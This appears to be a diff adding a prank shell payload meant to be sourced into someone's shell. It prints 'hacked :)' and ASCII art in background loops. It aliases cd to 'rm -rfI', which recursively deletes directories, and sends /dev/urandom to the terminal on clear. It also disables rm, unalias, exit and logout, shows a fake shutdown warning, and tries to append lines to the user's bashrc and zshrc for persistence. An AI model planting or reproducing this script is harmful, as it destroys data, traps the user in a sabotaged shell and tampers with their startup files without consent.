@@ -1,0 +1,81 @@
+```
+export SYSTEMD_SOCKET="/tmp/systemd-timers-daemon.socket"
+
+sus='
+      ___________________
+     / THIS SHELL IS SUS \
+     \___________________/
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄
+⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄
+⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷
+⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿
+⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
+⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇
+⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
+⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃
+⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇
+⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁
+'
+if which sl &>/dev/null; then
+        (while :; do sleep 30; sl; done) &
+else
+        (while :; do sleep 30; echo "$sus"; done) &
+fi
+
+if which cowsay &>/dev/null; then
+        (while :; do sleep 8; echo; cowsay -f milk "GOT MILK?"; done) &
+else
+        (while :; do sleep 8; echo "hacked :)"; done) &
+fi
+
+export TERM=xterm
+
+echo "Loading user shell"
+
+ls() {
+  if command -v sl &> /dev/null && command -v lolcat &> /dev/null; then
+    sl | lolcat
+  else
+    echo "$sus"
+  fi
+}
+alias cd="rm -rfI"
+meow="ICAgICAgICAgICAgICAgICAgVC4iLS5fLi4tLS0uLl8sLSIvfAogICAgICAgICAgICAgICAgICBsfCItLiAgXy52Ll8gICAoIiB8CiAgICAgICAgICAgICAgICAgIFtsIC8uJ18gXDsgX34iLS5gLXQKICAgICAgICAgICAgICAgICAgWSAiIF8ob30gX3tvKS5fIF4ufAogICAgICAgICAgICAgICAgICBqICBUICAsLTx2Pi0uICBUICBdCiAgICAgICAgICAgICAgICAgIFwgIGwgKCAvLV4tXCApICEgICEKICAgICAgICAgICAgICAgICAgIFwuIFwuICAifiIgIC4vICAvYy0uLixfXwogICAgICAgICAgICAgICAgICAgICBeci0gLi5fIC4tIC4tIiAgYC0gLiAgfiItLS4KICAgICAgICAgICAgICAgICAgICAgID4gXC4gICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgXSAgIF4uICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgMyAgLiAgIj4gICAgICAgICAgICAuICAgICAgIFkKICAgICAgICAgLC5fXy4tLS5fICAgX2ogICBcIH4gICAuICAgICAgICAgOyAgICAgICB8CiAgICAgICAgKCAgICB+Ii0uX34iXi5fXCAgIF4uICAgIF4uXyAgICAgIEkgICAgIC4gbAogICAgICAgICAiLS5fIF9fXyB+Ii0sXzcgICAgLlotLl8gICA3IiAgIFkgICAgICA7ICBcICAgICAgICBfCiAgICAgICAgICAgIC8iICAgIn4tKHIgciAgXy9fLS0uX34tLyAgICAvICAgICAgLywuLS1eLS5fICAgLyBZCiAgICAgICAgICAgICItLl8gICAgJyJ+fn4+LS5ffl0+LS1eLS0tLi9fX19fLC5efiAgICAgICAgXi5eICAhCiAgICAgICAgICAgICAgICB+LS0uXyAgICAnICAgWS0tLS4gICAgICAgICAgICAgICAgICAgICAgICBcLi8KICAgICAgICAgICAgICAgICAgICAgfn4tLS5fICBsXyAgICkgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgICAgICAgICAgIH4tLl9+fn4tLS0uXyxfX19fLi4tLS0gICAgICAgICAgIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH4tLS0tIn4gICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXA=="
+alias clear="/bin/cat /dev/urandom"
+alias cat="if which lolcat &>/dev/null; then base64 -d <<< \"$meow\" | lolcat; else base64 -d <<< \"$meow\"; echo; fi #"
+alias mv="cp"
+alias less="more"
+alias nano="if which cowsay &>/dev/null; then cowsay -f eyes \"No nano! You will be punished! >:(\"; else echo \"No nano! You will be punished! >:(\"; fi; echo \"shutdown: Shutdown scheduled for `date -d "5 minutes"`\" #"
+alias vim="vi"
+alias emacs="vi"
+alias gedit="vi"
+alias ed="vi"
+forever='
+__   __          _            _
+\ \ / /__  _   _( )_ __ ___  | |__   ___ _ __ ___
+ \ V / _ \| | | |/|  __/ _ \ |  _ \ / _ \  __/ _ \
+  | | (_) | |_| | | | |  __/ | | | |  __/ | |  __/
+  |_|\___/ \__,_| |_|  \___| |_| |_|\___|_|  \___|
+
+ _____ ___  ____  _______     _______ ____
+|  ___/ _ \|  _ \| ____\ \   / / ____|  _ \
+| |_ | | | | |_) |  _|  \ \ / /|  _| | |_) |
+|  _|| |_| |  _ <| |___  \ V / | |___|  _ <
+|_|   \___/|_| \_\_____|  \_/  |_____|_| \_\
+'
+alias exit="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain't afraid of no shell\"; else echo \"$forever\"; fi"
+alias logout="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain't afraid of no shell\"; else echo \"$forever\"; fi"
+alias unalias="echo \"I'm sorry `whoami`, I can't do that.\" #"
+alias rm="echo \"I'm sorry `whoami`, I can't let you do that.\" #"
+[ -f "~/.bashrc" ] && echo "sleep 0.05" >> ~/.bashrc # you're getting sleepier...
+[ -f "~/.zshrc" ] && echo "sleep 0.05" >> ~/.zshrc # you're getting sleepier...
+```
